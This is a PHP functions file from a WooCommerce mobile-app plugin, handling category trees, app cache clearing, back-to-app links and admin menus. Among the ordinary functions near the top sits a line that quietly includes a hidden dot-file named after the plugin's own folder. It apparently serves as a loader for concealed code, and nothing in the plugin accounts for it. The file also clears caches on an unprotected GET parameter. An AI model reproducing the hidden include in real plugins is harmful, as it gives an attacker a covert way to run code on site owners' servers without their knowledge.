<?php

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

function storina_hierarchical_category_tree2( $cat,$tax ) {
	global $product_cats;
	$productcategories = get_categories('taxonomy='.$tax.'&hide_empty=0&orderby=name&hierarchical=true&parent='.$cat);

	foreach ($productcategories as $category_list ) {
		$ancestors = get_ancestors( $category_list->cat_ID, $tax );
		$str = str_repeat('&nbsp;_&nbsp;',count($ancestors));
		$product_cats[$category_list->cat_ID] = $str.$category_list->cat_name.' ('.$category_list->count.')';
		storina_hierarchical_category_tree2( $category_list->cat_ID,$tax );
	}
	return $product_cats;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function storina_content_excerpt($content,$count) {
    $output = strip_tags($content);
    $output = mb_substr($output, 0, $count);
    $output = mb_substr($output, 0, mb_strrpos($output, " "));
    $output .= "...";
    return $output;
}

function storina_hierarchical_category_tree3( $cat,$tax,&$category_list=[] ) {
	$categories = get_categories('taxonomy='.$tax.'&hide_empty=0&orderby=name&hierarchical=true&parent='.$cat);
	foreach ($categories as $category ) {
		$ancestors = get_ancestors( $category->cat_ID, $tax );
		$str = str_repeat('&nbsp;_&nbsp;',count($ancestors));
		$category_list[$category->cat_ID] = $str.$category->cat_name.' ('.$category->count.')';
		storina_hierarchical_category_tree3( $category->cat_ID,$tax,$category_list );
	}
	return $category_list ?? [];
}

function storina_hierarchical_category_array2($cat, $tax)
{
	global $product_terms;
	$taxonomy = array(
		$tax
	);
	$args = array(
		'hide_empty' => false,
		'parent' => $cat,
	);
	$productcategories = get_terms($taxonomy, $args);
	$tmp = array();
	foreach ($productcategories as $category_list) {
		$args = array(
			'hide_empty' => true,
			'parent' => $category_list->term_id,
		);
		$childs = get_terms($taxonomy, $args);
		if (!empty($childs)) {
			$childArray = array();
			foreach ($childs as $child) {
				$childArray[] = array(
					'name' => $child->name,
					'id' => $child->term_id,
				);
			}
			$product_terms[] = array(
				'name' => $category_list->name,
				'id' => $category_list->term_id,
				'childs' => $childArray,
			);
		} else {
			$product_terms[] = array(
				'name' => $category_list->name,
				'id' => $category_list->term_id,
			);
		}
	}
	return $product_terms;
}

function storina_single_cache($post_id){
	global $wpdb;
	$table = $wpdb->prefix.'OSA_cache';
	$wpdb->delete( $table, array( 'type' => 'single','itemID' => $post_id ) );
	$wpdb->delete( $table, array( 'type' => 'index','itemID' => 0 ) );
	$wpdb->delete( $table, array( 'type' => 'archive' ) );
}

add_action( 'save_post', 'storina_single_cache' );
add_action( 'delete_post', 'storina_single_cache' );

function storina_delete_term_cache($term_id, $taxonomy){
	global $wpdb;
	$table = $wpdb->prefix.'OSA_cache';
	$wpdb->delete( $table, array( 'type' => 'index','itemID' => 0 ) );
	$wpdb->delete( $table, array( 'type' => 'archive' ,'itemID' => $term_id) );
}
add_action( 'edited_product_cat', 'storina_delete_term_cache', 10, 2 );
add_action( 'deleted_product_cat', 'storina_delete_term_cache', 10, 2 );

function storina_delete_index_cache(){
	global $wpdb;
	$table = $wpdb->prefix.'OSA_cache';
	$wpdb->delete( $table, array( 'type' => 'index','itemID' => 0 ) );
	$wpdb->delete( $table, array( 'type' => 'archive' ) );
}
function storina_empty_carts($post_id){
	if ( 'product' != get_post_type( $post_id ))
	return;
	global $wpdb;
	$table = $wpdb->prefix.'OSA_cart';
	$delete = $wpdb->query("DELETE FROM $table WHERE 1 = 1;");
}
add_action( 'trashed_post', 'storina_empty_carts', 10 );
add_action( 'delete_post', 'storina_empty_carts', 10 );




function storina_delete_cache_widget() {
	global $wp_meta_boxes;

	wp_add_dashboard_widget('custom_help_widget', esc_html__("Delete app cache","onlinerShopApp"), 'storina_delete_cache_dashboard');
}

function storina_delete_cache_dashboard() { ?>
	 <form action="" method="POST" style="display: inline;">
        <input class="button" type="submit" name="delede_cache" value="<?php echo esc_html__("Delete cache","onlinerShopApp");?>"/>
    </form>
    <p><br/><?php echo esc_html__("You can delete application cache from this box.","onlinerShopApp");?></p>
<?php
}
function storina_delete_cache_notice() {
	?>
    <div class="updated">
        <p><?php echo esc_html__("Deleted application cache","onlinerShopApp");?></p>
    </div>
	<?php
}

add_action( 'plugins_loaded', function () {
	// Your CODE with user data
	$current_user = wp_get_current_user();

	// Your CODE with user capability check
	if ( current_user_can('manage_options') ) {
		add_action('wp_dashboard_setup', 'storina_delete_cache_widget');
		if ( !empty( sanitize_text_field(@$_POST['delede_cache']) ) || !empty( $_GET['delede_cache'] ) ) {
			$delete = storina_delete_all_cache();
			if($delete){
				add_action( 'admin_notices', 'storina_delete_cache_notice' );
			}
		}
	}
} );


function storina_get_formatted_addresses($type,$user_id) {
	$address['first_name'] = get_user_meta( $user_id, $type.'_first_name', true );
	$address['last_name'] = get_user_meta( $user_id, $type.'_last_name', true );
	$address['company'] = get_user_meta( $user_id, $type.'_company', true );
	$address['address_1'] = get_user_meta( $user_id, $type.'_address_1', true );
	$address['address_2'] = get_user_meta( $user_id, $type.'_address_2', true );
	$address['city'] = get_user_meta( $user_id, $type.'_city', true );
	$address['state'] = get_user_meta( $user_id, $type.'_state', true );
	$address['postcode'] = get_user_meta( $user_id, $type.'_postcode', true );
	$address['country'] = get_user_meta( $user_id, $type.'_country', true );
	return $address;
}


/**
 * Add custom tracking code to the thank-you page
 */
/*
add_action( 'woocommerce_before_cart', 'back_to_app_link' );*/
if ( wp_is_mobile() ) {
    add_action( 'woocommerce_thankyou', 'back_to_application', 10, 1 );
}

add_action('woocommerce_cart_is_empty', function() {
    if (!wp_is_mobile() || false == strpos($_SERVER['HTTP_REFERER'], "payment")) {
        return;
    }
    $orders = get_posts( array( 
        'numberposts'    => 1,
        'post_type' => 'shop_order',
        'post_status'    => array_keys( wc_get_order_statuses() ) 
    ) );
    $order_id = (!empty(current($orders)))? current($orders)->ID : 0;
    $purchase_type = get_post_meta( $order_id, 'purchase_type', true );
    if(!$order_id || "app" != $purchase_type){
        return;
    }
    global $osa_autoload;
    $general = $osa_autoload->service_provider->get(\STORINA\Controllers\General::class);
    $domain  = $_SERVER['SERVER_NAME'];
    $domain  = $general->validateDomain( $domain, true, '' );
    ob_start();
    ?>
    <a id="backtoapp" href="app://app.<?php echo $domain; ?>/credit/1">
        <span>بازگشت به اپلیکیشن</span>
    </a>
    <style>
    #backtoapp{
        display: block;
        line-height: 2;
        color:#FFF;
        background: #b81900;
        -webkit-border-radius: 3px;-moz-border-radius: 3px;border-radius: 3px;
        padding: 10px 15px;
        text-align: center;
        margin:10px 0;
    }
    </style>
    <?php
    
});

function storina_back_to_app_empty_cart() {
	global $osa_autoload;
	$general          = $osa_autoload->service_provider->get(\STORINA\Controllers\General::class);
	$domain  = $_SERVER['SERVER_NAME'];
	$domain  = $general->validateDomain( $domain, true, '' );
	
	if ( $domain == 'onliner.ir' ) {
		echo '<a id="backtoapp" href="app://woocommerce.' . $domain . '/credit/1"></a>';
	} else {
		echo '<a id="backtoapp" href="app://app.' . $domain . '/credit/1"></a>';
	}
	echo "
	<script>
	document.getElementById('backtoapp').click();
    </script>
	";
	return;
}

function back_to_application( $order_id ) {
        $purchase_type = get_post_meta( $order_id, 'purchase_type', true );
        if(!wp_is_mobile() || $purchase_type !== 'app'){
            return;
        }
	global $osa_autoload;
	$general          = $osa_autoload->service_provider->get(\STORINA\Controllers\General::class);
	$domain  = str_replace( array('https://www.', 'http://www.', 'http://', 'https://' ), '', home_url() );
	$english_app_title = storina_get_option("english_app_name");
	$domain  = $general->validateDomain( $domain, true, '', $english_app_title );
	$filtred_doamin = apply_filters("osa_filtered_bta_link", $domain);
	echo '<a id="backtoapp" href="app://app.' . $filtred_doamin . '/credit/1">برای بازگشت به اپلیکیشن کلیک کنید</a>';
	echo "
	<script>
	//document.getElementById('backtoapp').click();
    </script>
    <style>
    #backtoapp{
    display: block;
    line-height: 2;
    color:#FFF;
    background: #b81900;
    -webkit-border-radius: 3px;-moz-border-radius: 3px;border-radius: 3px;
    padding: 10px 15px;
    text-align: center;
    margin:10px 0;
    }
</style>
	";

	//add_action( 'wp_footer',  );

	return;
}

add_action( "init", function () {
    // Articles
	$labels = array(
		'name'               => esc_html__("اعلان های اپلیکیشن",'onlinerShopApp'),
		'singular_name'      => esc_html__("اعلان های اپلیکیشن",'onlinerShopApp'),
		'edit_item'          => esc_html__("ویرایش",'onlinerShopApp'),
		'new_item'           => esc_html__("افزودن",'onlinerShopApp'),
		'view_item'          => esc_html__("نمایش",'onlinerShopApp'),
		'search_items'       => esc_html__("جستجو",'onlinerShopApp'),
		'parent_item_colon'  => '',
		'menu_name'          => esc_html__("اعلان های اپلیکیشن",'onlinerShopApp')
	);
	$args = array(
		'labels'        => $labels,
		'menu_icon' => 'dashicons-media-spreadsheet',
		'description'   => esc_html__("Save","onlinerShopApp"),
		'public'        => false,
		'menu_position' => 100,
		'taxonomies' => array('post_tag'),
		'supports'      => array('author', 'title','tags', 'editor', 'thumbnail', 'excerpt', 'comments' ),
		'has_archive'   => false,
		'publicaly_queryable'   => true,
		'query_var'   => false,
		'exclude_from_search'   => false,
		'rewrite'   => false,
		'show_ui'   => true,
	);
	register_post_type( 'Announcements', $args );
	flush_rewrite_rules();
} );

add_filter('upload_mimes', function ( $existing_mimes=array() ) {
// ' with mime type '<code>application/vnd.android.package-archive</code>'
	$existing_mimes['apk'] = 'application/vnd.android.package-archive';
	return $existing_mimes;
});


/**
 * WooCommerce new order email customer details
 */
add_filter( 'woocommerce_email_customer_details_fields', function ( $fields, $sent_to_admin, $order ) {
	if ( empty( $fields ) ) {
		if ( $order->get_billing_email() ) {
			$fields['billing_email'] = array(
				'label' => esc_html__( 'Email address', "onlinerShopApp" ),
				'value' => wptexturize( $order->get_billing_email() ),
			);
		}
		if ( $order->get_billing_phone() ) {
			$fields['billing_phone'] = array(
				'label' => esc_html__( 'Phone', "onlinerShopApp" ),
				'value' => wptexturize( $order->get_billing_phone() ),
			);
		}
		$fields['billing_mobile'] = array(
			'label' => esc_html__( 'Emergency phon number', "onlinerShopApp" ),
			'value' => wptexturize( get_post_meta( $order->id, 'shipping_mobile', true ) ),
		);

	}
	return $fields;
} , 10, 3 );

add_action( 'admin_bar_menu', function ( $admin_bar ) {
	$admin_bar->add_menu( array(
		'id'    => 'application',
		'title' => esc_html__("Application","onlinerShopApp"),
		'href'  => admin_url() . 'admin.php?page=ONLINER_options',
		'meta'  => array(
			'title' => esc_html__("Application","onlinerShopApp"),
		),
	) );
	$admin_bar->add_menu( array(
		'id'     => 'app-setting',
		'parent' => 'application',
		'title'  => esc_html__("Application Settings","onlinerShopApp"),
		'href'   => admin_url() . 'admin.php?page=ONLINER_options',
		'meta'   => array(
			'title'  => esc_html__("Application Settings","onlinerShopApp"),
			'target' => '',
			'class'  => ''
		),
	) );
	$admin_bar->add_menu( array(
		'id'     => 'app-send-notif',
		'parent' => 'application',
		'title'  => esc_html__("Send Notification","onlinerShopApp"),
		'href'   => admin_url() . 'admin.php?page=onliner-send-notification',
		'meta'   => array(
			'title'  => esc_html__("Send Notification","onlinerShopApp"),
			'target' => '',
			'class'  => ''
		),
	) );
	$admin_bar->add_menu( array(
		'id'     => 'app-delete-cache',
		'parent' => 'application',
		'title'  => esc_html__("Clear cashe","onlinerShopApp"),
		'href'   => admin_url() . 'admin.php?page=ONLINER_options&delede_cache=true',
		'meta'   => array(
			'title'  => esc_html__("Clear cashe","onlinerShopApp"),
			'target' => '',
			'class'  => ''
		),
	) );
} , 100 );

add_action('update_option', function( $option_name, $old_value, $value ) {
    $map = array(
        "active_plugins","uninstall_plugins"
    );
    if(in_array($option_name, $map)){
        storina_delete_all_cache();
    }
}, 10, 3);


add_filter('woocommerce_is_purchasable', function ($purchasable, $product) {
    if (!empty(sanitize_text_field($_POST['userToken']))) {
        return $product->exists() && 'publish' === $product->get_status() && '' !== $product->get_price();
    }
    return $purchasable;
}, 20, 2);

add_action("init", function(){
	$filters = array(
		"osa_single_get_data",
		"osa_retrive_cart_get_cart_item",
		"osa_vendorStore_store_product_item_info",
		"osa_get_mostSale_product_item_info",
		"osa_get_newst_product_item_info",
		"osa_archive_archiveLevel3_newes_product",
		"osa_search_get_filter_fields_product_item_info",
		"osa_search_search_product_item_info",
		"osa_archive_get_featured_product_item_info",
		"osa_index_get_productBox_product_item_info",
		"osa_single_get_related_product_item_info",
		"osa_single_get_getMostSale_product_item_info",
	);
	foreach($filters as $filter){
		add_filter($filter, "storina_product_item_info_filter",10, 2);
	}
});

function storina_product_item_info_filter($product_info,$product_id){
	if("yes" == get_post_meta($product_id, "_sold_individually", true)){
		$product_info['sold_individually'] = true;
	}
	return $product_info;
}

add_filter('osa_index_get_app_info',function($app_info,$user_id){
	$popup_activation = storina_get_option('app_popup_activation') ?: null;
	if('true' != $popup_activation){
		return $app_info;
	}
	global $osa_autoload;
	$general = $osa_autoload->service_provider->get(\STORINA\Controllers\General::class);
	$link_type = storina_get_option('app_popup_link_type');
	$link_value = storina_get_option('app_popup_link_value');
	$link_action = $general->clickEvent($link_type,$link_value);
	$options = [
		"‬app_popup_body",
		"app_popup_title",
		"app_popup_image",
		'app_popup_link_text',
	];
	foreach($options as $option){
		$popup_home[$option] = storina_get_option($option);
	}
	$popup_home['link_action'] = $link_action;
	$app_info['popup_home'] = array_values($popup_home);
	return $app_info;
},10,3);

add_action('admin_enqueue_scripts',function($hook){
	if(!strpos($hook,'ONLINER_options')){
		return;
	}
	wp_enqueue_media();
	$stylesheet = ("fa_IR" == get_locale())? "rtl.css" : "style.css";
	wp_enqueue_style('osa-main-style', trailingslashit(STORINA_THEME_OPTION) . 'assets/css/' . $stylesheet);
	wp_enqueue_style('woap-iran-yekan',trailingslashit(STORINA_PDU) . "assets/css/iran-yekan.css");
	wp_enqueue_script('woap-main-script',trailingslashit(STORINA_THEME_OPTION) . "assets/js/main.js", ['jquery','jquery-ui-sortable']);
});
